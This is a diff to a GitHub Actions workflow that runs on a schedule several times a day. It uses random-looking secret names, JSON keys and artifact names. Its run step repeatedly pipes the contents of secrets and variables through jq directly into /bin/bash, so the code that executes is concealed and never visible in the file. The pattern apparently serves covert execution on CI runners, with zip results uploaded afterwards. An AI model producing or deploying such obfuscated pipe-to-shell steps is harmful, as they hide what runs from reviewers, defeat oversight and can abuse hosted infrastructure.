@@ -3,31 +3,32 @@ on:
   workflow_dispatch:
 
   schedule:
-    - cron: '2 3,9,15,21 * * *'
-concurrency:
-  group: ${{ github.workflow }}-${{ github.ref }}
-  cancel-in-progress: true
+    - cron: '0 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
 jobs:
-  run:
+  execute:
+    name: Main task
     runs-on: ubuntu-latest
-    timeout-minutes: 360
     steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 1
-      - name: Build and run
+      - name: Checkout
+        uses: actions/checkout@v4
+      - name: Run
         env:
-          tz773: ${{ secrets.tz773 }}
+          fcpey9712: ${{ secrets.fcpey9712 }}
         run: |
-          printf '%s' "$tz773" | jq -r .sx096 | /bin/bash
-          printf '%s' "$rkpo041" | jq -r .uudti16 | /bin/bash
-          printf '%s' "$b16483" | jq -r .xjh17 | /bin/bash
-          printf '%s' "$db2014" | jq -r .lup1046 | /bin/bash
+          printf '%s' "$fcpey9712" | jq -r .m62475 | /bin/bash
+          printf '%s' "$smus774" | jq -r .cwni30 | /bin/bash
+          printf '%s' "$xrs11" | jq -r .qjk924 | /bin/bash
+          echo $re655 | jq -r .yfjtu9 | /bin/bash
+          printf '%s' "$iiwx74" | jq -r .cya4656 | /bin/bash
+          echo $dwhq9146 | jq -r .f0 | /bin/bash
+          printf '%s' "$tp079" | jq -r .l63139 | /bin/bash
 
-      - name: Upload artifact
-        if: always()
+      - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: xd6B88c1
+          name: NBKQXUpj
           path: "*.zip"
           retention-days: 1
